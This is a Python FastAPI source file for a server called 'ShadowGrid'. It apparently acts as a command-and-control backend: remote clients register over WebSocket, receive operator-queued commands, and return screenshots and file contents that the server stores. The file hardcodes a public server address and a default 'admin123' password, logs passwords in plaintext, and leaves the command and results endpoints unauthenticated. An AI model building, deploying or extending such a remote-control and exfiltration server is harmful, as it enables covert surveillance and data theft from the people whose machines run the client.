import os
import uuid
import asyncio
import base64
import json
import time
from pathlib import Path
from typing import Optional
import argparse

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request, Form, Header
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
import uvicorn
import ssl

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")

SERVER_URL = "113.45.254.80:8444"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8444
CLIENT_ID = None
CLIENT_HOSTNAME = None

SECRET_KEY = os.environ.get("SECRET_KEY", "shadowgrid-secret-key-change-in-production")

app = FastAPI(title="ShadowGrid")

clients: dict = {}
os.makedirs("screenshots", exist_ok=True)

BASE_DIR = Path(__file__).parent
templates = Jinja2Templates(directory=BASE_DIR / "templates")


class LoginRequest(BaseModel):
    password: str


def get_admin_password(password_arg: Optional[str] = None) -> str:
    return ADMIN_PASSWORD


def verify_password(password: str, admin_password: str) -> bool:
    print(f"[DEBUG] verify_password: compare '{password}' (len={len(password)}) == '{admin_password}' (len={len(admin_password)})")
    result = password == admin_password
    print(f"[DEBUG] verify_password result: {result}")
    return result


@app.post("/login")
async def login(request: Request, password: Optional[str] = Form(default=None), authorization: Optional[str] = Header(None), admin_password: Optional[str] = None):
    actual_password = ADMIN_PASSWORD
    print(f"[DEBUG] Expected password: {actual_password}")
    
    if authorization and authorization.startswith("Basic "):
        try:
            auth_str = base64.b64decode(authorization[6:]).decode()
            print(f"[DEBUG] Auth string: {auth_str}")
            _, pwd = auth_str.split(":", 1)
            print(f"[DEBUG] Extracted password: {pwd}")
            if verify_password(pwd, actual_password):
                print("[DEBUG] Login successful via Basic Auth")
                return JSONResponse({"status": "ok", "message": "Login successful"})
        except Exception as e:
            print(f"[DEBUG] Basic Auth error: {e}")
    
    if password and verify_password(password, actual_password):
        print("[DEBUG] Login successful via password")
        return JSONResponse({"status": "ok", "message": "Login successful"})
    
    raise HTTPException(status_code=401, detail="Invalid password")


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.get("/", response_class=HTMLResponse)
async def welcome(request: Request):
    return templates.TemplateResponse("index.html", {
        "request": request,
        "project_name": "ShadowGrid",
        "version": "1.0",
        "status": "Running",
        "client_count": len([c for c in clients.values() if c.get("ws")])
    })


@app.post("/register")
def register(req: dict):
    cid = req.get("client_id") or f"client-{uuid.uuid4().hex[:8]}"
    clients[cid] = {"ws": None, "hostname": req.get("hostname"), "ip": None}
    return {"client_id": cid, "status": "ok"}


@app.get("/clients")
def list_clients():
    print(f"[DEBUG] /clients called, clients: {[(k, v.get('hostname'), v.get('ip'), v.get('ws')) for k, v in clients.items()]}")
    return {"clients": [
        {"id": k, "hostname": v.get("hostname"), "ip": v.get("ip")}
        for k, v in clients.items() if v.get("ws")
    ]}


@app.post("/command/{client_id}")
def send_command(client_id: str, cmd: dict):
    if client_id not in clients or not clients[client_id].get("ws"):
        return {"error": "Client not connected"}
    clients[client_id]["pending"] = cmd
    return {"status": "sent"}


@app.get("/results/{client_id}")
def get_results(client_id: str):
    if client_id not in clients:
        return {"results": []}
    results = clients[client_id].get("results", [])
    clients[client_id]["results"] = []
    return {"results": results}


@app.get("/screenshot/{client_id}/{filename}")
def get_screenshot(client_id: str, filename: str):
    path = os.path.join("screenshots", f"{client_id}_{filename}")
    return FileResponse(path) if os.path.exists(path) else {"error": "Not found"}


@app.websocket("/ws/{client_id}")
async def ws_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    client_ip = websocket.client[0] if websocket.client else "unknown"
    if client_id not in clients:
        clients[client_id] = {"ws": None, "results": []}
    clients[client_id].update({"ws": websocket, "ip": client_ip})
    
    try:
        msg = await asyncio.wait_for(websocket.receive_json(), timeout=5.0)
        if msg.get("type") == "register":
            clients[client_id].update({
                "hostname": msg.get("hostname"),
                "unique_id": msg.get("unique_id", client_id)
            })
        
        while True:
            if pending := clients[client_id].get("pending"):
                cmd_id = f"cmd-{int(time.time() * 1000)}"
                payload = {"type": "command", "id": cmd_id, "payload": pending}
                print(f"[Server] Sending: {payload}")
                await websocket.send_json(payload)
                clients[client_id]["pending"] = None
            
            try:
                msg = await asyncio.wait_for(websocket.receive_json(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            
            if msg.get("type") == "result":
                result_data = msg.get("result", {})
                result_type = result_data.get("result_type", "")
                
                if result_type == "screenshot" and result_data.get("result"):
                    img_data = result_data.get("result", "")
                    filename = result_data.get("filename", "shot.png")
                    save_path = os.path.join("screenshots", f"{client_id}_{filename}")
                    try:
                        with open(save_path, "wb") as f:
                            f.write(base64.b64decode(img_data))
                        print(f"[Server] Screenshot saved: {save_path}")
                    except Exception as e:
                        print(f"[Server] Save error: {e}")
                
                if result_type == "file_read" and result_data.get("result"):
                    file_data = result_data.get("result", "")
                    filename = result_data.get("filename", "download.bin")
                    save_path = os.path.join("screenshots", f"{client_id}_{filename}")
                    try:
                        with open(save_path, "wb") as f:
                            f.write(base64.b64decode(file_data))
                        print(f"[Server] File saved: {save_path}")
                    except Exception as e:
                        print(f"[Server] File save error: {e}")
                
                clients[client_id]["results"].append(result_data)
                print(f"[Server] Received result: {result_type}")
    except WebSocketDisconnect:
        clients[client_id]["ws"] = None


def generate_ssl_cert():
    cert_path = BASE_DIR / "cert.pem"
    key_path = BASE_DIR / "key.pem"
    
    # 检查文件是否已存在且非空
    if cert_path.exists() and key_path.exists() and cert_path.stat().st_size > 0 and key_path.stat().st_size > 0:
        return str(cert_path), str(key_path)
    
    try:
        # 首先尝试使用subprocess模块配合openssl命令
        import subprocess
        import shutil
        
        # 检查系统是否安装了openssl
        openssl_exists = shutil.which("openssl") is not None
        
        if openssl_exists:
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:4096",
                "-keyout", str(key_path), "-out", str(cert_path),
                "-days", "365", "-nodes",
                "-subj", "/C=CN/ST=State/L=City/O=Organization/CN=localhost"
            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[SSL] Generated self-signed cert via openssl: {cert_path}, {key_path}")
            return str(cert_path), str(key_path)
        else:
            print("[SSL] OpenSSL not found, generating certificate via cryptography library...")
            
            # 如果OpenSSL不可用，使用Python内置库生成证书
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime
            import ipaddress
            
            # 生成私钥
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            
            # 修复时间相关的未来兼容问题  
            now = datetime.datetime.now(datetime.timezone.utc)
            
            # 创建证书
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "CN"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "State"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "City"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Organization"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                now
            ).not_valid_after(
                now + datetime.timedelta(days=365)
            ).add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName("localhost"),
                    x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                    # 可能还有其他的IP需要添加
                    x509.IPAddress(ipaddress.IPv4Address("0.0.0.0")),
                ]),
                critical=False,
            ).sign(private_key, hashes.SHA256())
            
            # 写入私钥文件（PEM格式）
            with open(key_path, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
            # 写入证书文件（PEM格式）
            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(encoding=serialization.Encoding.PEM))
            
            print(f"[SSL] Generated self-signed cert via cryptography lib: {cert_path}, {key_path}")
            return str(cert_path), str(key_path)
                
    except ImportError:
        # 如果cryptography库不存在，跳过证书生成
        print("[SSL] Python cryptography library not found. Please install it with: pip install cryptography")
        
    except Exception as e:
        print(f"[SSL] Generate cert failed: {e}")
        print("[SSL] Install OpenSSL or cryptography library to enable TLS")
        
    return None, None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowGrid Server")
    args = parser.parse_args()
    
    admin_password = get_admin_password()
    
    SERVER_HOST_ENV = os.environ.get("SERVER_HOST", SERVER_HOST)
    SERVER_PORT_ENV = int(os.environ.get("SERVER_PORT", SERVER_PORT))
    
    cert_path, key_path = generate_ssl_cert()
    
    if cert_path and key_path:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(cert_path, key_path)
        
        uvicorn.run(
            app,
            host=SERVER_HOST_ENV,
            port=SERVER_PORT_ENV,
            ssl_keyfile=key_path,
            ssl_certfile=cert_path
        )
    else:
        print("[ERROR] Cannot enable SSL, using HTTP (insecure)")
        uvicorn.run(app, host=SERVER_HOST_ENV, port=SERVER_PORT_ENV)
